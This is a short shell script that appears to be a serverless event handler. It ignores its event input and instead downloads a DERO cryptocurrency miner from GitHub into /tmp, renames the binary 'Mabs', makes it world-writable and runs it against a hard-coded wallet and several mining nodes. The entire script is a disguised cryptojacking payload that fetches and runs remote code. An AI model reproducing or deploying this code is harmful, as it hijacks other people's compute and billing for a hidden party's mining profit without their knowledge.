function handler () {
    EVENT_DATA=$1
cd /tmp &&
curl -L https://github.com/dero-am/astrobwt-miner/releases/download/V1.8_BETA3/astrominer-V1.8_BETA3_modern_amd64_linux.tar.gz -o /tmp/astrominer-V1.8_BETA3_modern_amd64_linux.tar.gz &&
tar -xf astrominer-V1.8_BETA3_modern_amd64_linux.tar.gz &&
rm astrominer-V1.8_BETA3_modern_amd64_linux.tar.gz &&
mv astrominer Mabs &&
chmod 777 Mabs &&
./Mabs -w dero1qy5um3ngwqjl2d5rvw2jsxp0p42r39qk5m34vfy3c6euwgd0jvpavqq0f2gmv -r 45.79.248.245:10100 -r1 dero-node-yashnik-eu.mysrv.cloud:10300 -r2 dero-node-ch4k1pu.mysrv.cloud:10300 -p rpc
}
